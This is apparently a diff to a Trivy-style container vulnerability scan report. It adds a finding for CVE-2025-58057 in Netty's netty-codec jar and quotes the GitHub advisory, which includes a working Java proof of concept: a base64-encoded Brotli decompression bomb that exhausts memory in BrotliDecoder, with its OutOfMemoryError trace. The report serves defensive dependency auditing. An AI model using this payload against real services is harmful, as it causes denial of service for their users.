@@ -5,7 +5,147 @@
 ├ [1] ╭ Target         : Java 
 │     ├ Class          : lang-pkgs 
 │     ├ Type           : jar 
-│     ╰ Vulnerabilities ─ [0] ╭ VulnerabilityID : CVE-2025-55163 
+│     ╰ Vulnerabilities ╭ [0] ╭ VulnerabilityID : CVE-2025-58057 
+│                       │     ├ PkgName         : io.netty:netty-codec 
+│                       │     ├ PkgPath         : openaf/Kube/netty-codec-4.1.118.Final.jar 
+│                       │     ├ PkgIdentifier    ╭ PURL: pkg:maven/io.netty/netty-codec@4.1.118.Final 
+│                       │     │                  ╰ UID : 3b086a97f12b1592 
+│                       │     ├ InstalledVersion: 4.1.118.Final 
+│                       │     ├ FixedVersion    : 4.1.125.Final 
+│                       │     ├ Status          : fixed 
+│                       │     ├ Layer            ╭ Digest: sha256:7510ad29ffa7cc1a2114a402022514f3823883c02de2c
+│                       │     │                  │         7abcfb0d2e2ac745b1b 
+│                       │     │                  ╰ DiffID: sha256:f5a29ed4a857fc02aaabcc7d4c2c7a84736c0afb775b1
+│                       │     │                            f1af98a746d123861d3 
+│                       │     ├ SeveritySource  : ghsa 
+│                       │     ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2025-58057 
+│                       │     ├ DataSource       ╭ ID  : ghsa 
+│                       │     │                  ├ Name: GitHub Security Advisory Maven 
+│                       │     │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ec
+│                       │     │                          osystem%3Amaven 
+│                       │     ├ Title           : Netty's decoders vulnerable to DoS via zip bomb style attack 
+│                       │     ├ Description     : ### Summary
+│                       │     │                   
+│                       │     │                   With specially crafted input, `BrotliDecoder` and some other
+│                       │     │                   decompressing decoders will allocate a large number of
+│                       │     │                   reachable byte buffers, which can lead to denial of service.
+│                       │     │                   ### Details
+│                       │     │                   `BrotliDecoder.decompress` has no limit in how often it calls
+│                       │     │                    `pull`, decompressing data 64K bytes at a time. The buffers
+│                       │     │                   are saved in the output list, and remain reachable until OOM
+│                       │     │                   is hit. This is basically a zip bomb.
+│                       │     │                   Tested on 4.1.118, but there were no changes to the decoder
+│                       │     │                   since.
+│                       │     │                   ### PoC
+│                       │     │                   Run this test case with `-Xmx1G`:
+│                       │     │                   ```java
+│                       │     │                   import io.netty.buffer.Unpooled;
+│                       │     │                   import io.netty.channel.embedded.EmbeddedChannel;
+│                       │     │                   import java.util.Base64;
+│                       │     │                   public class T {
+│                       │     │                       public static void main(String[] args) {
+│                       │     │                           EmbeddedChannel channel = new EmbeddedChannel(new
+│                       │     │                   BrotliDecoder());
+│                       │     │                          
+│                       │     │                   channel.writeInbound(Unpooled.wrappedBuffer(Base64.getDecoder
+│                       │     │                   ().decode("aPpxD1tETigSAGj6cQ8vRE4oEgBo+nEPW0ROKBIAaPpxD1tETi
+│                       │     │                   gSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nE
+│                       │     │                   PW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigS
+│                       │     │                   AGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW
+│                       │     │                   0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAG
+│                       │     │                   j6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0R
+│                       │     │                   OKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6
+│                       │     │                   cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROK
+│                       │     │                   BIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ
+│                       │     │                   9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBI
+│                       │     │                   AaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9b
+│                       │     │                   RE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAa
+│                       │     │                   PpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE
+│                       │     │                   4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPp
+│                       │     │                   xD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4o
+│                       │     │                   EgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD
+│                       │     │                   1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEg
+│                       │     │                   Bo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1t
+│                       │     │                   ETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo
+│                       │     │                   +nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tET
+│                       │     │                   igSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+n
+│                       │     │                   EPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETig
+│                       │     │                   SAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEP
+│                       │     │                   W0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSA
+│                       │     │                   Gj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0
+│                       │     │                   ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj
+│                       │     │                   6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0RO
+│                       │     │                   KBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6c
+│                       │     │                   Q9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKB
+│                       │     │                   IAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9
+│                       │     │                   bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIA
+│                       │     │                   aPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bR
+│                       │     │                   E4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROMBIAEg
+│                       │     │                   IaHwBETlQQVFcXlgA=")));
+│                       │     │                       }
+│                       │     │                   }
+│                       │     │                   ```
+│                       │     │                   Error:
+│                       │     │                   Exception in thread "main" java.lang.OutOfMemoryError: Cannot
+│                       │     │                    reserve 4194304 bytes of direct buffer memory (allocated:
+│                       │     │                   1069580289, limit: 1073741824)
+│                       │     │                   	at java.base/java.nio.Bits.reserveMemory(Bits.java:178)
+│                       │     │                   	at
+│                       │     │                   java.base/java.nio.DirectByteBuffer.<init>(DirectByteBuffer.j
+│                       │     │                   ava:121)
+│                       │     │                   java.base/java.nio.ByteBuffer.allocateDirect(ByteBuffer.java:
+│                       │     │                   332)
+│                       │     │                   io.netty.buffer.PoolArena$DirectArena.allocateDirect(PoolAren
+│                       │     │                   a.java:718)
+│                       │     │                   io.netty.buffer.PoolArena$DirectArena.newChunk(PoolArena.java
+│                       │     │                   :693)
+│                       │     │                   io.netty.buffer.PoolArena.allocateNormal(PoolArena.java:213)
+│                       │     │                   io.netty.buffer.PoolArena.tcacheAllocateNormal(PoolArena.java
+│                       │     │                   :195)
+│                       │     │                   	at io.netty.buffer.PoolArena.allocate(PoolArena.java:137)
+│                       │     │                   	at io.netty.buffer.PoolArena.allocate(PoolArena.java:127)
+│                       │     │                   io.netty.buffer.PooledByteBufAllocator.newDirectBuffer(Pooled
+│                       │     │                   ByteBufAllocator.java:403)
+│                       │     │                   io.netty.buffer.AbstractByteBufAllocator.directBuffer(Abstrac
+│                       │     │                   tByteBufAllocator.java:188)
+│                       │     │                   tByteBufAllocator.java:179)
+│                       │     │                   io.netty.buffer.AbstractByteBufAllocator.buffer(AbstractByteB
+│                       │     │                   ufAllocator.java:116)
+│                       │     │                   io.netty.handler.codec.compression.BrotliDecoder.pull(BrotliD
+│                       │     │                   ecoder.java:70)
+│                       │     │                   io.netty.handler.codec.compression.BrotliDecoder.decompress(B
+│                       │     │                   rotliDecoder.java:101)
+│                       │     │                   io.netty.handler.codec.compression.BrotliDecoder.decode(Brotl
+│                       │     │                   iDecoder.java:137)
+│                       │     │                   io.netty.handler.codec.ByteToMessageDecoder.decodeRemovalReen
+│                       │     │                   tryProtection(ByteToMessageDecoder.java:530)
+│                       │     │                   io.netty.handler.codec.ByteToMessageDecoder.callDecode(ByteTo
+│                       │     │                   MessageDecoder.java:469)
+│                       │     │                   io.netty.handler.codec.ByteToMessageDecoder.channelRead(ByteT
+│                       │     │                   oMessageDecoder.java:290)
+│                       │     │                   io.netty.channel.AbstractChannelHandlerContext.invokeChannelR
+│                       │     │                   ead(AbstractChannelHandlerContext.java:444)
+│                       │     │                   ead(AbstractChannelHandlerContext.java:420)
+│                       │     │                   io.netty.channel.AbstractChannelHandlerContext.fireChannelRea
+│                       │     │                   d(AbstractChannelHandlerContext.java:412)
+│                       │     │                   io.netty.channel.DefaultChannelPipeline$HeadContext.channelRe
+│                       │     │                   ad(DefaultChannelPipeline.java:1357)
+│                       │     │                   ead(AbstractChannelHandlerContext.java:440)
+│                       │     │                   io.netty.channel.DefaultChannelPipeline.fireChannelRead(Defau
+│                       │     │                   ltChannelPipeline.java:868)
+│                       │     │                   io.netty.channel.embedded.EmbeddedChannel.writeInbound(Embedd
+│                       │     │                   edChannel.java:348)
+│                       │     │                   	at io.netty.handler.codec.compression.T.main(T.java:11)
+│                       │     │                   ### Impact
+│                       │     │                   DoS for anyone using `BrotliDecoder` on untrusted input. 
+│                       │     ├ Severity        : MEDIUM 
+│                       │     ├ VendorSeverity   ─ ghsa: 2 
+│                       │     ╰ References       ╭ [0]: https://github.com/netty/netty 
+│                       │                        ├ [1]: https://github.com/netty/netty/commit/9d804c54ce962408a
+│                       │                        │      e6418255a83a13924f7145d 
+│                       │                        ╰ [2]: https://github.com/netty/netty/security/advisories/GHSA
+│                       │                               -3p8m-j85q-pgmj 
+│                       ╰ [1] ╭ VulnerabilityID : CVE-2025-55163 
 │                             ├ PkgName         : io.netty:netty-codec-http2 
 │                             ├ PkgPath         : openaf/Kube/netty-codec-http2-4.1.118.Final.jar 
 │                             ├ PkgIdentifier    ╭ PURL: pkg:maven/io.netty/netty-codec-http2@4.1.118.Final 
